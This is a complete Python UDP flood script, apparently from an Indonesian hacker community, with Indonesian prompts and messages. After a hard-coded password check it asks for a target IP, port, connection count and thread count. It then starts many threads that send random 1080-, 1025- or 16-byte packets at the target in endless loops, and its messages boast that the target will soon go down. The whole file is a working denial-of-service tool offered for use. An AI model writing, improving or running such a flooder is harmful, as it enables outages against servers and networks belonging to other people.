#Credit
#XvCommunity
#Val.

import random
import socket
import threading
import os,sys
import time

password = input("[ + ] Password : ")
if password == "Val.X":
    print("correct password")
    time.sleep(2)
else :
    print("Password wrong")
    time.sleep(100000)

os.system("clear")
print("Xv Community x Val")
print("Jangan Buat Pamer !!")
print("Jangan Abuse!!")
ip = str(input(" Ipnya:"))
port = int(input(" Portnya:"))
choice = str(input("Gas Serang? (y/n):"))
times = int(input(" Koneksi:"))
threads = int(input(" Faket:"))

os.system("clear")
def run():
	data = random._urandom(1080)
	i = random.choice(("[•]","[•]","[X]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Faket Dari Val!!!")
		except:
			print("[*] Udah Entar Down Banh")

def run2():
	data = random._urandom(1025)
	i = random.choice(("[•]","[*]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Faket Dari Val!!!")
		except:
			s.close()
			print("[#] Udah Entar Down Banh")

def run3():
	data = random._urandom(16)
	i = random.choice(("[#]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Faket Dari Val!!")
		except:
			s.close()
			print("[•] Udah Entar Down Banh")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
	else:
		th = threading.Thread(target = run3)
		th.start()